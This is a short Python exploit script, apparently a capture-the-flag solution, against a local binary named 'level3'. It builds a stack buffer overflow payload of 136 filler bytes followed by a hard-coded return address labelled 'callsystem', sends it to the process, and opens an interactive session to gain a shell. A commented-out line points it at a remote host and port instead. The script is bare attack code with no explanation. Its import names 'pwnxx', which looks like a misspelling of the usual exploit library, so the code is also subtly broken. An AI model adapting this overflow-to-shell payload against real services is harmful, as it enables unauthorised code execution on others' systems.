#!/usr/bin/env python
from pwnxx import *

elf = ELF('level3')

p = process('./level3')
#p = remote('127.0.0.1',10001)

callsystem = 0x0000000000400584

payload = "A"*136 + p64(callsystem)

p.send(payload)

p.interactive()


